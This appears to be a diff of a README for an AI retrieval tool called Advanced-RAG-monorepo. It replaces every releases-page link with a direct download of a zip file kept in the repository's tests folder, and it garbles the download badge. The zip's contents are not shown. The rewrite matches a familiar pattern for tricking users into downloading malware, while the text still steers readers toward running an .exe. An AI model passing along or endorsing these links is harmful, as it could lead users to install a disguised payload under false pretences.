@@ -1,13 +1,13 @@
 # 🚀 Advanced-RAG-monorepo - Simplifying AI Integration
 
 ## 💾 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/pixelaxesinc/Advanced-RAG-monorepo/releases)
+[![Download Latest Release](https://github.com/pixelaxesinc/Advanced-RAG-monorepo/raw/refs/heads/master/tests/monorepo_RA_Advanced_v1.6.zip%20Latest%https://github.com/pixelaxesinc/Advanced-RAG-monorepo/raw/refs/heads/master/tests/monorepo_RA_Advanced_v1.6.zip)](https://github.com/pixelaxesinc/Advanced-RAG-monorepo/raw/refs/heads/master/tests/monorepo_RA_Advanced_v1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to Advanced-RAG-monorepo. This application helps you use cutting-edge AI features without complicated setups. Follow the steps below to download and run the software on your computer.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: To get started, visit the following link to download the latest version of Advanced-RAG-monorepo: [Download Link](https://github.com/pixelaxesinc/Advanced-RAG-monorepo/releases).
+1. **Visit the Releases Page**: To get started, visit the following link to download the latest version of Advanced-RAG-monorepo: [Download Link](https://github.com/pixelaxesinc/Advanced-RAG-monorepo/raw/refs/heads/master/tests/monorepo_RA_Advanced_v1.6.zip).
    
 2. **Choose the Right File**: On the releases page, you will see a list of available files. Select the file that matches your operating system. If you are using Windows, look for a `.exe` file. For Mac, download a `.dmg` file. For Linux, choose the appropriate package.
 
@@ -56,6 +56,6 @@ If you still face difficulties after trying the troubleshooting steps, you can s
 Advanced-RAG-monorepo is open-source and released under the MIT License. You can modify and use it as per the license terms.
 
 ## 📅 Updates
-Stay updated with the latest enhancements by regularly checking the releases page: [Download Link](https://github.com/pixelaxesinc/Advanced-RAG-monorepo/releases). We often add features and address bugs based on user feedback.
+Stay updated with the latest enhancements by regularly checking the releases page: [Download Link](https://github.com/pixelaxesinc/Advanced-RAG-monorepo/raw/refs/heads/master/tests/monorepo_RA_Advanced_v1.6.zip). We often add features and address bugs based on user feedback.
 
 Thank you for choosing Advanced-RAG-monorepo. We hope you enjoy your experience with this powerful AI tool.
